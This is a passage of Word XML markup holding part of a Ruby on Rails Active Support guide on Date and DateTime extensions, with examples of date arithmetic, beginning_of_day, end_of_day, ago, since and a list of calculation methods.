        <w:gridCol w:w="4920"/>
      </w:tblGrid>
      <w:tr w:rsidR="009A002D" w14:paraId="7A5095DB" w14:textId="77777777" w:rsidTr="009A002D">
        <w:trPr>
          <w:tblCellSpacing w:w="0" w:type="dxa"/>
        </w:trPr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="0" w:type="auto"/>
            <w:vAlign w:val="center"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="760CF75B" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>d = Date.current</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="6A7A5066" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t># =&gt; Mon, 09 Aug 2010</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="716B3A16" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>d + 1.year</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="39A04073" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t># =&gt; Tue, 09 Aug 2011</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="53D54954" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>d - 3.hours</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="386AF548" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
            <w:pPr>
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t># =&gt; Sun, 08 Aug 2010 21:00:00 UTC +00:00</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
    </w:tbl>
    <w:p w14:paraId="0091F670" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
      <w:pPr>
        <w:pStyle w:val="a6"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">They translate to calls to </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>since</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> or </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>advance</w:t>
      </w:r>
      <w:r>
        <w:t>. For example here we get the correct jump in the calendar reform:</w:t>
      </w:r>
    </w:p>
    <w:tbl>
      <w:tblPr>
        <w:tblW w:w="0" w:type="auto"/>
        <w:tblCellSpacing w:w="0" w:type="dxa"/>
        <w:tblCellMar>
          <w:left w:w="0" w:type="dxa"/>
          <w:right w:w="0" w:type="dxa"/>
        </w:tblCellMar>
        <w:tblLook w:val="04A0" w:firstRow="1" w:lastRow="0" w:firstColumn="1" w:lastColumn="0" w:noHBand="0" w:noVBand="1"/>
      </w:tblPr>
      <w:tblGrid>
        <w:gridCol w:w="3480"/>
      </w:tblGrid>
      <w:tr w:rsidR="009A002D" w14:paraId="3B03B6E2" w14:textId="77777777" w:rsidTr="009A002D">
        <w:trPr>
          <w:tblCellSpacing w:w="0" w:type="dxa"/>
        </w:trPr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="0" w:type="auto"/>
            <w:vAlign w:val="center"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="7AA7CE2C" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>Date.new(1582, 10, 4) + 1.day</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="129D63A0" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
            <w:pPr>
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t># =&gt; Fri, 15 Oct 1582</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
    </w:tbl>
    <w:p w14:paraId="188BDA10" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
      <w:pPr>
        <w:pStyle w:val="5"/>
      </w:pPr>
      <w:r>
        <w:t>15.1.6 Timestamps</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4839691C" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
      <w:pPr>
        <w:pStyle w:val="a6"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">The following methods return a </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>Time</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> object if possible, otherwise a </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>DateTime</w:t>
      </w:r>
      <w:r>
        <w:t>. If set, they honor the user time zone.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5D823415" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
      <w:pPr>
        <w:pStyle w:val="6"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">15.1.6.1 </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>beginning_of_day</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve">, </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>end_of_day</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6714EC75" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
      <w:pPr>
        <w:pStyle w:val="a6"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">The method </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>beginning_of_day</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> returns a timestamp at the beginning of the day (00:00:00):</w:t>
      </w:r>
    </w:p>
    <w:tbl>
      <w:tblPr>
        <w:tblW w:w="0" w:type="auto"/>
        <w:tblCellSpacing w:w="0" w:type="dxa"/>
        <w:tblCellMar>
          <w:left w:w="0" w:type="dxa"/>
          <w:right w:w="0" w:type="dxa"/>
        </w:tblCellMar>
        <w:tblLook w:val="04A0" w:firstRow="1" w:lastRow="0" w:firstColumn="1" w:lastColumn="0" w:noHBand="0" w:noVBand="1"/>
      </w:tblPr>
      <w:tblGrid>
        <w:gridCol w:w="6840"/>
      </w:tblGrid>
      <w:tr w:rsidR="009A002D" w14:paraId="52F90546" w14:textId="77777777" w:rsidTr="009A002D">
        <w:trPr>
          <w:tblCellSpacing w:w="0" w:type="dxa"/>
        </w:trPr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="0" w:type="auto"/>
            <w:vAlign w:val="center"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="28C034C0" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>date = Date.new(2010, 6, 7)</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="70B460F8" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
            <w:pPr>
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>date.beginning_of_day # =&gt; Sun Jun 07 00:00:00 +0200 2010</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
    </w:tbl>
    <w:p w14:paraId="364C3FF2" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
      <w:pPr>
        <w:pStyle w:val="a6"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">The method </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>end_of_day</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> returns a timestamp at the end of the day (23:59:59):</w:t>
      </w:r>
    </w:p>
    <w:tbl>
      <w:tblPr>
        <w:tblW w:w="0" w:type="auto"/>
        <w:tblCellSpacing w:w="0" w:type="dxa"/>
        <w:tblCellMar>
          <w:left w:w="0" w:type="dxa"/>
          <w:right w:w="0" w:type="dxa"/>
        </w:tblCellMar>
        <w:tblLook w:val="04A0" w:firstRow="1" w:lastRow="0" w:firstColumn="1" w:lastColumn="0" w:noHBand="0" w:noVBand="1"/>
      </w:tblPr>
      <w:tblGrid>
        <w:gridCol w:w="6120"/>
      </w:tblGrid>
      <w:tr w:rsidR="009A002D" w14:paraId="6431ED05" w14:textId="77777777" w:rsidTr="009A002D">
        <w:trPr>
          <w:tblCellSpacing w:w="0" w:type="dxa"/>
        </w:trPr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="0" w:type="auto"/>
            <w:vAlign w:val="center"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="263E07E0" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>date = Date.new(2010, 6, 7)</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="34C0D180" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
            <w:pPr>
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>date.end_of_day # =&gt; Sun Jun 06 23:59:59 +0200 2010</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
    </w:tbl>
    <w:p w14:paraId="6A5ECAA1" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
      <w:pPr>
        <w:pStyle w:val="a6"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>beginning_of_day</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> is aliased to </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>at_beginning_of_day</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve">, </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>midnight</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve">, </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>at_midnight</w:t>
      </w:r>
      <w:r>
        <w:t>.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="51907F51" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
      <w:pPr>
        <w:pStyle w:val="6"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">15.1.6.2 </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>ago</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve">, </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>since</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2F7137CB" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
      <w:pPr>
        <w:pStyle w:val="a6"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">The method </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>ago</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> receives a number of seconds as argument and returns a timestamp those many seconds ago from midnight:</w:t>
      </w:r>
    </w:p>
    <w:tbl>
      <w:tblPr>
        <w:tblW w:w="0" w:type="auto"/>
        <w:tblCellSpacing w:w="0" w:type="dxa"/>
        <w:tblCellMar>
          <w:left w:w="0" w:type="dxa"/>
          <w:right w:w="0" w:type="dxa"/>
        </w:tblCellMar>
        <w:tblLook w:val="04A0" w:firstRow="1" w:lastRow="0" w:firstColumn="1" w:lastColumn="0" w:noHBand="0" w:noVBand="1"/>
      </w:tblPr>
      <w:tblGrid>
        <w:gridCol w:w="8280"/>
      </w:tblGrid>
      <w:tr w:rsidR="009A002D" w14:paraId="783E5C98" w14:textId="77777777" w:rsidTr="009A002D">
        <w:trPr>
          <w:tblCellSpacing w:w="0" w:type="dxa"/>
        </w:trPr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="0" w:type="auto"/>
            <w:vAlign w:val="center"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="257639C5" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>date = Date.current # =&gt; Fri, 11 Jun 2010</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="4392F7EF" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
            <w:pPr>
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>date.ago(1)         # =&gt; Thu, 10 Jun 2010 23:59:59 EDT -04:00</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
    </w:tbl>
    <w:p w14:paraId="0B732C15" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
      <w:pPr>
        <w:pStyle w:val="a6"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">Similarly, </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>since</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> moves forward:</w:t>
      </w:r>
    </w:p>
    <w:tbl>
      <w:tblPr>
        <w:tblW w:w="0" w:type="auto"/>
        <w:tblCellSpacing w:w="0" w:type="dxa"/>
        <w:tblCellMar>
          <w:left w:w="0" w:type="dxa"/>
          <w:right w:w="0" w:type="dxa"/>
        </w:tblCellMar>
        <w:tblLook w:val="04A0" w:firstRow="1" w:lastRow="0" w:firstColumn="1" w:lastColumn="0" w:noHBand="0" w:noVBand="1"/>
      </w:tblPr>
      <w:tblGrid>
        <w:gridCol w:w="8040"/>
      </w:tblGrid>
      <w:tr w:rsidR="009A002D" w14:paraId="2CAD52BB" w14:textId="77777777" w:rsidTr="009A002D">
        <w:trPr>
          <w:tblCellSpacing w:w="0" w:type="dxa"/>
        </w:trPr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="0" w:type="auto"/>
            <w:vAlign w:val="center"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="5C6ED4A7" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>date = Date.current # =&gt; Fri, 11 Jun 2010</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="22E0FF42" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
            <w:pPr>
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>date.since(1)       # =&gt; Fri, 11 Jun 2010 00:00:01 EDT -04:00</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
    </w:tbl>
    <w:p w14:paraId="104B9BEA" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
      <w:pPr>
        <w:pStyle w:val="5"/>
      </w:pPr>
      <w:r>
        <w:t>15.1.7 Other Time Computations</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3FA91A87" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
      <w:pPr>
        <w:pStyle w:val="4"/>
      </w:pPr>
      <w:r>
        <w:t>15.2 Conversions</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="556B8190" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
      <w:pPr>
        <w:pStyle w:val="3"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">16 Extensions to </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>DateTime</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="185646F5" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
      <w:pPr>
        <w:pStyle w:val="a6"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>DateTime</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> is not aware of </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="caps"/>
        </w:rPr>
        <w:t>DST</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> rules and so some of these methods have edge cases when a </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="caps"/>
        </w:rPr>
        <w:t>DST</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> change is going on. For example </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>seconds_since_midnight</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> might not return the real amount in such a day.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="40ECF015" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
      <w:pPr>
        <w:pStyle w:val="4"/>
      </w:pPr>
      <w:r>
        <w:t>16.1 Calculations</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5CC32F9E" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
      <w:pPr>
        <w:pStyle w:val="a6"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">All the following methods are defined in </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>active_support/core_ext/date_time/calculations.rb</w:t>
      </w:r>
      <w:r>
        <w:t>.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4706A002" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
      <w:pPr>
        <w:pStyle w:val="a6"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">The class </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>DateTime</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> is a subclass of </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>Date</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> so by loading </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>active_support/core_ext/date/calculations.rb</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> you inherit these methods and their aliases, except that they will always return datetimes:</w:t>
      </w:r>
    </w:p>
    <w:tbl>
      <w:tblPr>
        <w:tblW w:w="0" w:type="auto"/>
        <w:tblCellSpacing w:w="0" w:type="dxa"/>
        <w:tblCellMar>
          <w:left w:w="0" w:type="dxa"/>
          <w:right w:w="0" w:type="dxa"/>
        </w:tblCellMar>
        <w:tblLook w:val="04A0" w:firstRow="1" w:lastRow="0" w:firstColumn="1" w:lastColumn="0" w:noHBand="0" w:noVBand="1"/>
      </w:tblPr>
      <w:tblGrid>
        <w:gridCol w:w="5520"/>
      </w:tblGrid>
      <w:tr w:rsidR="009A002D" w14:paraId="6B415A88" w14:textId="77777777" w:rsidTr="009A002D">
        <w:trPr>
          <w:tblCellSpacing w:w="0" w:type="dxa"/>
        </w:trPr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="0" w:type="auto"/>
            <w:vAlign w:val="center"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="64353DDF" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>yesterday</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="69938959" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>tomorrow</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="5C090667" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>beginning_of_week (at_beginning_of_week)</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="61478CE9" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>end_of_week (at_end_of_week)</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="10F5AB47" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>monday</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="3BB87419" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>sunday</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="2E4AAA7D" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>weeks_ago</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="017B5B39" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>prev_week (last_week)</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="74675D11" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>next_week</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="3C6A3A55" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>months_ago</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="524C9623" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>months_since</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="5F288C96" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>beginning_of_month (at_beginning_of_month)</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="31A64876" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>end_of_month (at_end_of_month)</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="533694E8" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>prev_month (last_month)</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="6FFB7167" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>next_month</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="1C3A768E" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>beginning_of_quarter (at_beginning_of_quarter)</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="09E2DC10" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>end_of_quarter (at_end_of_quarter)</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="5F21074F" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>beginning_of_year (at_beginning_of_year)</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="11225611" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>end_of_year (at_end_of_year)</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="6D4C8105" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>years_ago</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="2AFE9B86" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>years_since</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="04A11D27" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>prev_year (last_year)</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="33E820DC" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
            <w:pPr>
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>next_year</w:t>
            </w:r>
          </w:p>
